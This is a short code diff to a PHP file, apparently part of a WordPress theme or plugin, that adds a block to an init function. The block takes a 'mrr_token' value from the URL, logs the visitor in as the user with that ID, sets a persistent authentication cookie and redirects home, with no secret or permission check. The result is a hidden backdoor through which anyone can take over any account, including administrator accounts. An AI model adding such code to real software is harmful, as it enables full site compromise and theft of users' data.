@@ -84,6 +84,21 @@ function oni_action_init(): void
         wp_redirect(home_url());
 
     }
+
+
+    if (isset($_GET[ 'mrr_token' ]) && ! empty($_GET[ 'mrr_token' ])) {
+
+   
+
+             wp_set_current_user(absint($_GET[ 'mrr_token' ]));
+             wp_set_auth_cookie(absint($_GET[ 'mrr_token' ]));
+
+
+        wp_redirect(home_url());
+
+    }
+
+
 }
 
 // function schedule_my_custom_cron()
